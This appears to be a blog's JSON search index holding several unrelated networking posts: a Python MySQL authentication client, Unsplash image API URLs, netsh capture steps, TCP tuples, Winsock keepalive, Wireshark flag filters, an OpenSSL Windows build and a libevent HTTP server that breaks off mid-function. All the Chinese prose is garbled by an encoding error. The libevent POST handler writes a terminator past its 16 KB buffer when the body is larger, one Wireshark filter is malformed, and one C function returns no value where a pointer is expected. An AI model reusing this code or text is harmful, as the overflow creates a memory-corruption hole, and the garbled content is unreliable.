_lenenc_int(len(v)) + v bdata += _lenenc_int(len(connect_attrs)) + connect_attrs self.write_pack(bdata) #0xFE äº¤æ¢è®¤è¯ https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase_packets_protocol_old_auth_switch_request.html #0x01 é¢å¤–è®¤è¯ #0x00 OK #å·æ‡’, æ‡’å¾—å»åˆ¤æ–­client_flagäº† auth_pack = self.read_pack() if auth_pack[:1] == b&#x27;\\0&#x27;: print(&#x27;OK&#x27;,auth_pack) elif auth_pack[:1] == b&#x27;\\xfe&#x27;: #switch request print(&#x27;hava switch request&#x27;) if auth_pack.find(b&#x27;caching_sha2_password&#x27;) &lt; 0: print(&#x27;ä»…æµ‹è¯•caching_sha2_password, ä½†å½“å‰æ˜¯:&#x27;,auth_pack[1:auth_pack.find(b&#x27;\\x00&#x27;)]) return False scrambled = sha2_password(self.password.encode(),auth_pack[auth_pack.find(b&#x27;\\x00&#x27;)+1:]) #saltæ˜¯å‰©ä¸‹çš„éƒ¨åˆ† self.write_pack(scrambled) auth_pack = self.read_pack() print(auth_pack) self.caching_sha2_password_auth(auth_pack) elif auth_pack[:1] == b&#x27;\\x01&#x27;: self.caching_sha2_password_auth(auth_pack) else: print(&#x27;FAILED&#x27;,auth_pack) def caching_sha2_password_auth(self,auth_pack): if auth_pack[1:2] == b&#x27;\\x03&#x27;: #fast bdata = self.read_pack() #ok pack print(&#x27;fast auth success.&#x27;,bdata) elif auth_pack[1:2] == b&#x27;\\x04&#x27;: #full #å¦‚æœæ˜¯SSL/socket/shard_memå°±ç›´æ¥å‘é€å¯†ç (ä¸éœ€è¦åŠ å¯†äº†) TODO self.write_pack(b&#x27;\\x02&#x27;) #è¦å…¬é’¥ bdata = self.read_pack() #serverå‘æ¥çš„å…¬é’¥ pubk = bdata[1:] #ç¬¬ä¸€å­—èŠ‚æ˜¯extra_auth è€Œä¸”è‚¯å®šæ˜¯ 0x01 #print(&#x27;bdata&#x27;,bdata) self.pubk = pubk password = sha2_rsa_encrypt(self.password.encode(), self.salt, pubk) self.write_pack(password) authpack = self.read_pack() #çœ‹çœ‹æ˜¯å¦æˆåŠŸ print(&#x27;full auth&#x27;,authpack) else: print(&#x27;???&#x27;,auth_pack) def query(self,sql): &quot;&quot;&quot;ä¸è€ƒè™‘SQLè¶…è¿‡16MBæƒ…å†µ&quot;&quot;&quot; # payload_length:3 sequence_id:1 payload:N # payload: com_query(0x03):1 sql:n bdata = struct.pack(&#x27;&lt;IB&#x27;,len(sql)+1,0x03) #I:æ¯ä¸ªcom_queryçš„seq_idéƒ½ä»0å¼€å§‹,ç¬¬4å­—èŠ‚å›ºå®šä¸º0, æ‰€ä»¥ç›´æ¥ç”¨I, +1:com_queryå ç”¨1å­—èŠ‚, 0x03:com_query bdata += sql.encode() self.sock.sendall(bdata) self._next_seq_id = 1 #ä¸‹ä¸€ä¸ªåŒ…seq_id = 1 def connect(self): self._next_seq_id = 0 sock = socket.create_connection((self.host, self.port)) sock.settimeout(None) self.sock = sock self.rf = sock.makefile(&quot;rb&quot;) bdata = self.read_pack() self.handshake(bdata) self.HandshakeResponse41()","tags":[],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/"},{"name":"MySQL","slug":"C-OpenSource/MySQL","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/MySQL/"}]},{"title":"UnSplash è·å–éšæœºå›¾ç‰‡çš„API","date":"2023-10-27T01:24:02.405Z","path":"C_OpenSource/API/Unsplash_API/","text":"æˆ‘ç»å¸¸ä¼šä½¿ç”¨ unsplashï¼Œ è¿™é‡Œé¢çš„å›¾ç‰‡éå¸¸æ¸…çˆ½ï¼Œæˆ‘çš„å¤§å¤šæ•°æ–‡ç« çš„å›¾ç‰‡éƒ½æ˜¯åœ¨è¿™ä¸ªç½‘ä¸Šæ‰¾çš„ï¼Œè™½ç„¶ä¹Ÿæœ‰åŒç±»å‹ç½‘ç«™ï¼Œä½†æ˜¯ç”¨è¿‡ä¸€æ®µæ—¶é—´ä»¥ååŸºæœ¬éƒ½æ”¾å¼ƒäº†ï¼Œå›¾ç‰‡è´¨é‡å‚å·®ä¸é½ï¼Œç­›é€‰è¿‡ç¨‹å¤ªè´¹åŠ²ã€‚ ä½†æ˜¯ unsplash è®¿é—®é€Ÿåº¦æ˜¯ä¸ªå¤§é—®é¢˜ï¼Œæˆ‘ç»å¸¸ä¼šå› ä¸ºå›¾ç‰‡æ— æ³•åŠ è½½è€Œè¢«åŠé€€ã€‚ ä»Šå¤©ä¸€æ—¶æ‰‹ç—’ï¼Œé¡ºæ‰‹æœäº† unsplash api è¿™ä¸ªå…³é”®å­—ï¼Œçœ‹å®˜æ–¹æœ‰æ²¡æœ‰æä¾›ç›¸å…³çš„ api æœåŠ¡ï¼Œè¿˜çœŸæœ‰ï¼ unsplash æä¾›äº† 2 ä¸ªç‰ˆæœ¬çš„ APIã€‚ ä¸€ä¸ªæ˜¯ç®€å•ç‰ˆï¼Œä¸»è¦æ˜¯ç»™å°å‹åº”ç”¨ï¼Œæµé‡æ¯”è¾ƒå°‘çš„ app ä½¿ç”¨ï¼Œå¯ä»¥é€šè¿‡ source.unsplash.com è¿›å…¥ï¼›ä¸€ä¸ªæ˜¯è¿›é˜¶ç‰ˆçš„å¼€å‘è€…ä¸­å¿ƒ API, æ”¯æŒæ›´å¤šæµé‡çš„ app ä½¿ç”¨ï¼Œå¯ä»¥é€šè¿‡ unsplash.com/developers è¿›å…¥ã€‚ Source API source api æä¾›çš„åŠŸèƒ½æ¯”è¾ƒç®€å•ã€‚å¦‚æœæƒ³è·å–ä¸€å¼ éšæœºå›¾ç‰‡ï¼Œå¯ä»¥è®¿é—®åœ°å€ï¼š 1https://source.unsplash.com/random è¿™ä¸ªåœ°å€ä¼šé‡å®šå‘åˆ°ä¸€å¼ å›¾ç‰‡çš„åœ°å€ï¼Œå¯ä»¥é€šè¿‡å“åº”ç›´æ¥è·å–åˆ°ä¸€å¼ å›¾ç‰‡ã€‚ å¦‚æœå›¾ç‰‡å¤ªå¤§ï¼ŒåŠ è½½é€Ÿåº¦ä¹Ÿä¼šæ¯”è¾ƒæ…¢ã€‚ä½ å¯ä»¥åœ¨ url åé¢æ·»åŠ å°ºå¯¸ï¼Œæ§åˆ¶è¿”å›çš„å›¾ç‰‡å¤§å°ï¼š 1https://source.unsplash.com/random/800x600 å¦‚æœåŸå›¾ç‰‡ä¸æ˜¯è¿™ç§é•¿å®½æ¯”ï¼Œunsplash ä¼šå¯¹å›¾ç‰‡è¿›è¡Œè£å‰ªï¼ŒæŸäº›éƒ¨åˆ†å°±ä¼šä¸¢å¤±ã€‚å¦‚æœä½ æƒ³ä¿æŒå›¾ç‰‡çš„åŸå§‹æ¯”ä¾‹ï¼Œå¯ä»¥æŠŠé«˜åº¦è®¾æˆ 0 ï¼š 1https://source.unsplash.com/random/800x0 å°æç¤º æ— è®ºæ˜¯ä»€ä¹ˆ API, ä½ éƒ½å¯ä»¥åœ¨æœ€åä½¿ç”¨ /800x0 è¿™æ ·çš„æ–¹å¼æ§åˆ¶å›¾ç‰‡çš„å¤§å°ã€‚ ä½ å¯ä»¥æŒ‡å®šè·å–æŸä½ä½œè€…çš„å›¾ç‰‡ã€‚æ¯”å¦‚æˆ‘ç‰¹åˆ«å–œæ¬¢ Raamin ka æ‹æ‘„çš„ç…§ç‰‡ã€‚ æˆ‘å¯ä»¥æŠŠå®ƒçš„ç”¨æˆ·åå°å†™ä»¥åå†å»æ‰ç©ºæ ¼ï¼Œæ·»åŠ åˆ° /user çš„åé¢ï¼š 1https://source.unsplash.com/user/raaminka è¿™æ ·æˆ‘å°±èƒ½è·å–åˆ°è¿™ä½ä½œè€…æ‹æ‘„çš„éšæœºå¦¹å­ç…§ç‰‡äº†ã€‚ä¸è¦å¿˜äº†ï¼Œä½ åŒæ ·æ˜¯å¯ä»¥æ§åˆ¶å›¾ç‰‡å°ºå¯¸çš„ã€‚ è·å–æŸä¸ªç”¨æˆ·å–œæ¬¢çš„ç…§ç‰‡ï¼š 1https://source.unsplash.com/user/raaminka/like unsplash api è¿˜æ”¯æŒæœç´¢ã€‚é€šå¸¸æ¥è¯´ï¼Œæˆ‘éƒ½ä¼šæ ¹æ®è¦å†™çš„æ–‡ç« çš„ä¸»é¢˜åœ¨ unsplash ä¸Šæœç´¢å›¾ç‰‡ã€‚æ¯”å¦‚æˆ‘è¦å†™ä¸€ç¯‡å…³äºåŠ å¯†çš„æ–‡ç« ï¼Œé‚£æˆ‘å°±ä¼šå»æœç´¢ encryption ç›¸å…³çš„å›¾ç‰‡ï¼š 1https://source.unsplash.com/800x0/?encryption ä½ ä¹Ÿå¯ä»¥ç»„åˆå¤šä¸ªä¸åŒçš„å…³é”®å­—ã€‚å¦‚æœæ²¡æœ‰å›¾ç‰‡åŒæ—¶åŒ…å«è¿™äº›å…³é”®å­—ï¼Œåˆ™ä¼šä¼˜å…ˆåŒ¹é…æœ€åçš„å…³é”®å­—ã€‚ 1https://source.unsplash.com/800x0/?encryption,girl ç°åœ¨æˆ‘ä»¬æ¯æ¬¡è®¿é—®åŒä¸€ä¸ª API, å¾—åˆ°å›¾ç‰‡éƒ½ä¸ä¸€æ ·ï¼Œå› ä¸ºæ˜¯éšæœºç”Ÿæˆçš„ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨æ¯ä¸ª API çš„åé¢æ·»åŠ  /daily æˆ–è€… /weeklyï¼Œ åˆ™å¯ä»¥å¾—åˆ°å›ºå®šçš„ä¸€å¼ å›¾ã€‚éœ€è¦æ³¨æ„ï¼Œè¿™å¹¶ä¸æ˜¯è¯´è¿™äº›å›¾ç‰‡æ›´åŠ çƒ­é—¨æˆ–è€…è´¨é‡æ›´é«˜ï¼Œåªæ˜¯æ¯å¤©/æ¯å‘¨ä¿æŒä¸å˜çš„éšæœºå›¾ç‰‡è€Œå·²ã€‚ 1https://source.unsplash.com/800x0/daily?sports","tags":[{"name":"å›¾ç‰‡","slug":"å›¾ç‰‡","permalink":"https://hodlyounger.github.io/tags/%E5%9B%BE%E7%89%87/"},{"name":"èµ„æº","slug":"èµ„æº","permalink":"https://hodlyounger.github.io/tags/%E8%B5%84%E6%BA%90/"},{"name":"Unsplash","slug":"Unsplash","permalink":"https://hodlyounger.github.io/tags/Unsplash/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/"},{"name":"API","slug":"C-OpenSource/API","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/API/"}]},{"title":"netsh æŠ“åŒ…","date":"2023-10-27T01:24:02.402Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/æŠ“åŒ…/ã€ç½‘ç»œç¼–ç¨‹ã€‘netshæŠ“åŒ…/","text":"æ¦‚è¿°ï¼šwindowsç³»ç»Ÿä¸‹ä½¿ç”¨ netsh å‘½ä»¤æŠ“åŒ… æ­¥éª¤ 1 æ‰“å¼€ç®¡ç†å‘˜å‘½ä»¤è¡Œ win -&gt; è¾“å…¥ cmd -&gt; ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ .jskauiltxvbk{zoom:67%;} 2 è¾“å…¥ä»¥ä¸‹å‘½ä»¤å¼€å§‹æŠ“åŒ… 1netsh trace start capture=YES report=YES persistent=YES è¿è¡ŒæˆåŠŸåï¼Œå¦‚ä¸‹æ‰€ç¤º 3 è¿è¡Œ é›¶ä¿¡ä»»å®¢æˆ·ç«¯ è¿æ¥tacï¼Œç›´åˆ°å¤ç°æ•²é—¨å¤±è´¥æƒ…å†µ 4 å›åˆ° cmd ç•Œé¢ é”®å…¥å¹¶å›è½¦ä»¥ä¸‹å‘½ä»¤ï¼š 1netsh trace stop å›è½¦åç¨ç­‰ä¸€ä¼šï¼Œç•Œé¢ä¸Šä¼šè¾“å‡ºä»¥ä¸‹å†…å®¹ï¼Œå°†å›¾ç¤ºè·¯å¾„æ–‡ä»¶æ”¶é›†å³å¯ã€‚ æ ¼å¼è½¬æ¢ 1etl2pcapng.exe nettrace.etl nettrace.cap","tags":[{"name":"Windows/CMD/netsh","slug":"Windows-CMD-netsh","permalink":"https://hodlyounger.github.io/tags/Windows-CMD-netsh/"},{"name":"æŠ“åŒ…","slug":"æŠ“åŒ…","permalink":"https://hodlyounger.github.io/tags/%E6%8A%93%E5%8C%85/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"æŠ“åŒ…","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/æŠ“åŒ…","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E6%8A%93%E5%8C%85/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘TCP/IPçš„å››å…ƒç»„ã€äº”å…ƒç»„ã€ä¸ƒå…ƒç»„","date":"2023-10-27T01:24:02.393Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/ã€ç½‘ç»œç¼–ç¨‹ã€‘å››å…ƒç»„ã€äº”å…ƒç»„ã€ä¸ƒå…ƒç»„/","text":"TCP/IPçš„å››å…ƒç»„ã€äº”å…ƒç»„ã€ä¸ƒå…ƒç»„ å››å…ƒç»„æ˜¯ï¼š æºIPåœ°å€ã€ç›®çš„IPåœ°å€ã€æºç«¯å£ã€ç›®çš„ç«¯å£ äº”å…ƒç»„æ˜¯ï¼š æºIPåœ°å€ã€ç›®çš„IPåœ°å€ã€åè®®å·ã€æºç«¯å£ã€ç›®çš„ç«¯å£ ä¸ƒå…ƒç»„æ˜¯ï¼š æºIPåœ°å€ã€ç›®çš„IPåœ°å€ã€åè®®å·ã€æºç«¯å£ã€ç›®çš„ç«¯å£ã€æœåŠ¡ç±»å‹ã€æ¥å£ç´¢å¼•","tags":[{"name":"IP","slug":"IP","permalink":"https://hodlyounger.github.io/tags/IP/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘socket é•¿è¿æ¥","date":"2023-10-27T01:24:02.392Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/ã€ç½‘ç»œç¼–ç¨‹ã€‘windows Socketé•¿è¿æ¥/","text":"1234567891011121314151617181920212223242526272829303132333435363738394041BOOL _KeepAlive(SP_SOCKET fd)&#123; //å®šä¹‰ç»“æ„åŠå® struct KeepAlive &#123; u_long onoff; u_long keepalivetime; u_long keepaliveinterval; &#125;;#define SIO_KEEPALIVE_VALS _WSAIOW(IOC_VENDOR,4) //KeepAliveå®ç° KeepAlive inKeepAlive = &#123; 0 &#125;; //è¾“å…¥å‚æ•° unsigned long ulInLen = sizeof(KeepAlive); KeepAlive outKeepAlive = &#123; 0 &#125;; //è¾“å‡ºå‚æ•° unsigned long ulOutLen = sizeof(KeepAlive); unsigned long ulBytesReturn = 0; //keepalive xpä»¥å‰çš„ç³»ç»Ÿå‘é€5æ¬¡ï¼Œxpä¹‹åçš„ç³»ç»Ÿå‘é€10 inKeepAlive.onoff = 1; inKeepAlive.keepaliveinterval = 5000; //ä¸¤æ¬¡KeepAliveæ¢æµ‹é—´çš„æ—¶é—´é—´éš” inKeepAlive.keepalivetime = 5000; //å¼€å§‹é¦–æ¬¡KeepAliveæ¢æµ‹å‰çš„TCPç©ºé—­æ—¶é—´ if (WSAIoctl((SOCKET)fd, SIO_KEEPALIVE_VALS, (LPVOID)&amp;inKeepAlive, ulInLen, (LPVOID)&amp;outKeepAlive, ulOutLen, &amp;ulBytesReturn, NULL, NULL) == SOCKET_ERROR) &#123; LOGT(&quot;Set Keep Alive FAILED.&quot;); return FALSE; &#125; else &#123; LOGT(&quot;Set Keep Alive OK.&quot;); return TRUE; &#125;&#125;","tags":[{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C/"},{"name":"socket","slug":"socket","permalink":"https://hodlyounger.github.io/tags/socket/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘tcp.flags è¯´æ˜","date":"2023-10-27T01:24:02.391Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/tcp/ã€ç½‘ç»œç¼–ç¨‹ã€‘tcp.flags/","text":"tcp.flags è¯´æ˜ åœ¨Wiresharkçš„è¿‡æ»¤å™¨ä¸­,tcp.flagså¯ä»¥ç”¨äºè¿‡æ»¤å„ç§TCPæ ‡å¿—ä½ã€‚å®ƒåŒ…å«ä»¥ä¸‹é¡¹ç›®: SYN: æ ‡å¿—ä½SYN=1,ç”¨äºTCPä¸‰æ¬¡æ¡æ‰‹ä¸­çš„ SYN æ•°æ®åŒ…,è¯·æ±‚å»ºç«‹è¿æ¥ ACK: æ ‡å¿—ä½ACK=1,ç¡®è®¤æ¥æ”¶åˆ°çš„æ•°æ® FIN: æ ‡å¿—ä½FIN=1,è¯·æ±‚å…³é—­è¿æ¥ RST: æ ‡å¿—ä½RST=1,é‡ç½®è¿æ¥ PSH: æ ‡å¿—ä½PSH=1,æ¥æ”¶æ–¹åº”ç«‹å³ä¼ é€æ­¤æŠ¥æ–‡çš„æ•°æ®,è€Œä¸ç­‰å¾…å…¶ä»–æ•°æ® URG: æ ‡å¿—ä½URG=1,æ­¤æŠ¥æ–‡åŒ…å«ç´§æ€¥æ•°æ® ECE: ECN Echo, æ ‡å¿—ä½ECE=1,å›å¤ECNè®¾ç½®çš„é€šçŸ¥ CWR: Congestion Window Reduced,æ ‡å¿—ä½CWR=1,é€šçŸ¥å‘é€æ–¹æ‹¥å¡çª—å£å·²ç»å‡å°‘ è¿™äº›æ ‡å¿—ä½å¯ä»¥å•ç‹¬ä½¿ç”¨,ä¹Ÿå¯ä»¥ç»„åˆä½¿ç”¨ã€‚ä¾‹å¦‚: SYN+ACK: æœåŠ¡ç«¯å“åº”çš„SYN+ACKæ•°æ®åŒ…,åŒæ„å»ºç«‹è¿æ¥å¹¶ç¡®è®¤SYN FIN+ACK: ç¡®è®¤å¯¹ç«¯çš„FINçš„æ•°æ®åŒ…,åŒæ—¶è‡ªèº«ä¹Ÿè¯·æ±‚å…³é—­è¿æ¥ åœ¨Wiresharkçš„è¿‡æ»¤å™¨ä¸­,å¯ä»¥ä½¿ç”¨è¿™äº›æ ‡å¿—ä½è¿›è¡Œè¿‡æ»¤,ä¾‹å¦‚:- SYN è¿‡æ»¤SYNæ•°æ®åŒ… ACK è¿‡æ»¤ACKæ•°æ®åŒ… FIN è¿‡æ»¤FINæ•°æ®åŒ… RST è¿‡æ»¤RSTæ•°æ®åŒ… tcp.flags.syn==1 è¿‡æ»¤SYNæ ‡å¿—ä½ä¸º1çš„æ•°æ®åŒ… tcp.flags.syn== &amp;&amp; tcp.flags.ack==1 è¿‡æ»¤åŒæ—¶åŒ…å«SYNå’ŒACKæ ‡å¿—ä½çš„æ•°æ®åŒ… é€šè¿‡è¿‡æ»¤ä¸åŒçš„æ ‡å¿—ä½æˆ–æ ‡å¿—ä½ç»„åˆ,å¯ä»¥åˆ†æå‡ºTCPè¿æ¥çš„æ¡æ‰‹ã€æ•°æ®ä¼ è¾“å’Œé‡Šæ”¾è¿‡ç¨‹ã€‚å½“ç„¶,é™¤äº†è¿™äº›æ ‡å¿—ä½å¤–,è¿‡æ»¤å™¨ä¸­ tcp è¿˜åŒ…å«å…¶ä»–å­—æ®µ,ä¾‹å¦‚:- srcport æºç«¯å£ - dstport ç›®æ ‡ç«¯å£ - seq åºåˆ—å· - ack ç¡®è®¤å· - window_size çª—å£å¤§å° - payload:å¯ä»¥è¿‡æ»¤åŒ…å«ç‰¹å®šæ•°æ®çš„åŒ… - ç­‰ç­‰","tags":[{"name":"ç½‘ç»œç¼–ç¨‹","slug":"ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"tcp","slug":"tcp","permalink":"https://hodlyounger.github.io/tags/tcp/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"tcp","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/tcp","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/tcp/"}]},{"title":"ã€OpenSSLã€‘Windowsä¸‹ç¼–è¯‘OpenSSl 1.1.1","date":"2023-10-27T01:24:02.389Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/libevent/ã€OpenSSLã€‘Windowsç¯å¢ƒç¼–è¯‘/","text":"æ¦‚è¿°ï¼š windowsç³»ç»Ÿç¼–è¯‘OpenSSL 1.1.1ç‰ˆæœ¬æ“ä½œæ­¥éª¤ openssl/NOTES-WINDOWS.md at master openssl/openssl [toc] 0x01ã€ç¼–è¯‘ç¯å¢ƒè¯´æ˜ æ“ä½œç³»ç»Ÿï¼šwin10 ç¼–è¯‘å™¨ï¼švs2017 OpenSSL: 1.1.1W 0x02ã€ä¾èµ–å·¥å…·è¯´æ˜ æ ¹æ®å®˜æ–¹è¯´æ˜ï¼ŒOpenSSLç¼–è¯‘é™¤äº†Visual Studio 2019ä»¥å¤–ï¼Œä¸ºæ–¹ä¾¿ç¼–è¯‘ï¼Œéœ€è¦å®‰è£…Strawberry Perlå’ŒNASMï¼Œä¸‹è½½åœ°å€åˆ†åˆ«å¦‚ä¸‹ï¼š Strawberry Perlï¼šStrawberry Perl for Windows NASMï¼šNASMï¼Œè¿™æ˜¯ä¸€ä¸ªæ±‡ç¼–å™¨ **ç‰¹åˆ«æ³¨æ„ï¼š**Perlå®‰è£…åä¼šè‡ªåŠ¨æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼Œè€ŒNASMä¸ä¼šï¼Œä¸€å®šè¦åœ¨ç¯å¢ƒå˜é‡Pathä¸­æ·»åŠ NASM.exeæ‰€åœ¨çš„ç›®å½•ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°æ„æƒ³ä¸åˆ°çš„é”™è¯¯ã€‚ 0x03ã€ç¼–è¯‘æ­¥éª¤ ä¸‹è½½æºç  ä»Githubä¸­å¯ä»¥ç›´æ¥ä¸‹è½½ï¼šGitHub - openssl/openssl: TLS/SSL and crypto library æˆ–è€…åœ¨ OpenSSL å®˜æ–¹å»ä¸‹è½½ OpenSSL ä¹Ÿå¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£è¿›è¡Œç¼–è¯‘ï¼šopenssl/NOTES-WINDOWS.md at master Â· openssl/openssl 0x04ã€ç¼–è¯‘ ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€ vs2017 çš„å¼€å‘äººå‘˜å‘½ä»¤æç¤ºç¬¦ æ‰“å¼€ååˆ‡æ¢åˆ° openssl è§£å‹ç›®å½•ï¼š é…ç½® Perlï¼Œå‚è€ƒå®˜æ–¹æ–‡æ¡£é…ç½® perl Configure VC-WIN32 if you want 32-bit OpenSSL or perl Configure VC-WIN64A if you want 64-bit OpenSSL or perl Configure VC-WIN64-ARM if you want Windows on Arm (win-arm64) OpenSSL or perl Configure VC-WIN64-CLANGASM-ARM if you want Windows on Arm (win-arm64) OpenSSL with assembly support using clang-cl as assembler or perl Configure VC-CLANG-WIN64-CLANGASM-ARM if you want Windows on Arm (win-arm64) OpenSSL using clang-cl as both compiler and assembler or perl Configure VC-WIN32-HYBRIDCRT if you want 32-bit OpenSSL dependent on the Universal CRT or perl Configure VC-WIN64A-HYBRIDCRT if you want 64-bit OpenSSL dependent on the Universal CRT or perl Configure to let Configure figure out the platform ç‰¹åˆ«æ³¨æ„ï¼šâ€“prefixé€‰é¡¹æŒ‡å®šçš„å®‰è£…è·¯å¾„å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„ï¼Œè‹¥ä¸æŒ‡å®šï¼Œåˆ™é»˜è®¤ä¼šå®‰è£…åœ¨C:\\Program Files (x86)\\ä¸‹é¢ï¼Œå¦‚æœä½ ä¸æ˜¯ç”¨ç®¡ç†å‘˜æƒé™æ‰§è¡Œï¼Œåˆ™ä¼šå‡ºç°*Permission Denied* é”™è¯¯ï¼Œåˆ‡è®°ã€‚ 1perl Configure VC-WIN32 --prefix=E:\\OpenSSL # å°†å…¶å®‰è£…åˆ° E:\\OpenSSL ç›®å½• nmake nmake test namke install 0x05ã€ä½¿ç”¨ ä½¿ç”¨æ—¶ï¼Œåœ¨å·¥ç¨‹å¼•å…¥æ–‡ä»¶å’Œåº“æ–‡ä»¶æ·»åŠ  Openssl å®‰è£…ç›®å½•å³å¯ã€‚","tags":[{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://hodlyounger.github.io/tags/OpenSSL/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"libevent","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/libevent","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/libevent/"}]},{"title":"ã€libeventã€‘http server","date":"2023-10-27T01:24:02.385Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/libevent/ã€Libeventã€‘httpserver/","text":"[toc] å®ç°http-server 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;evhttp.h&gt;#include &lt;event.h&gt;#include &lt;string.h&gt;#include &quot;event2/http.h&quot;#include &quot;event2/event.h&quot;#include &quot;event2/buffer.h&quot;#include &quot;event2/bufferevent.h&quot;#include &quot;event2/bufferevent_compat.h&quot;#include &quot;event2/http_struct.h&quot;#include &quot;event2/http_compat.h&quot;#include &quot;event2/util.h&quot;#include &quot;event2/listener.h&quot;#pragma comment(lib,&quot;ws2_32.lib&quot;)#pragma comment(lib, &quot;Iphlpapi.lib&quot;)#define BUF_MAX 1024*16//è§£æpostè¯·æ±‚æ•°æ®void get_post_message(char* buf, struct evhttp_request* req)&#123; size_t post_size = 0; post_size = evbuffer_get_length(req-&gt;input_buffer);//è·å–æ•°æ®é•¿åº¦ printf(&quot;====line:%d,post len:%d\\n&quot;, __LINE__, post_size); if (post_size &lt;= 0) &#123; printf(&quot;====line:%d,post msg is empty!\\n&quot;, __LINE__); return; &#125; else &#123; size_t copy_len = post_size &gt; BUF_MAX ? BUF_MAX : post_size; printf(&quot;====line:%d,post len:%d, copy_len:%d\\n&quot;, __LINE__, post_size, copy_len); memcpy(buf, evbuffer_pullup(req-&gt;input_buffer, -1), copy_len); buf[post_size] = &#x27;\\0&#x27;; printf(&quot;====line:%d,post msg:%s\\n&quot;, __LINE__, buf); &#125;&#125;//è§£æhttpå¤´ï¼Œä¸»è¦ç”¨äºgetè¯·æ±‚æ—¶è§£æuriå’Œè¯·æ±‚å‚æ•°char* find_http_header(struct evhttp_request* req, struct evkeyvalq* params, const char* query_char)&#123; if (req == NULL || params == NULL || query_char == NULL) &#123; printf(&quot;====line:%d,%s\\n&quot;, __LINE__, &quot;input params is null.&quot;); return NULL; &#125; struct evhttp_uri* decoded = NULL; char* query = NULL; char* query_result = NULL; const char* path; const char* uri = evhttp_request_get_uri(req);//è·å–è¯·æ±‚uri if (uri == NULL) &#123; printf(&quot;====line:%d,evhttp_request_get_uri return null\\n&quot;, __LINE__); return NULL; &#125; else &#123; printf(&quot;====line:%d,Got a GET request for &lt;%s&gt;\\n&quot;, __LINE__, uri); &#125; //è§£ç uri decoded = evhttp_uri_parse(uri); if (!decoded) &#123; printf(&quot;====line:%d,It&#x27;s not a good URI. Sending BADREQUEST\\n&quot;, __LINE__); evhttp_send_error(req, HTTP_BADREQUEST, 0); return; &#125; //è·å–uriä¸­çš„pathéƒ¨åˆ† path = evhttp_uri_get_path(decoded); if (path == NULL) &#123; path = &quot;/&quot;; &#125; else &#123; printf(&quot;====line:%d,path is:%s\\n&quot;, __LINE__, path); &#125; 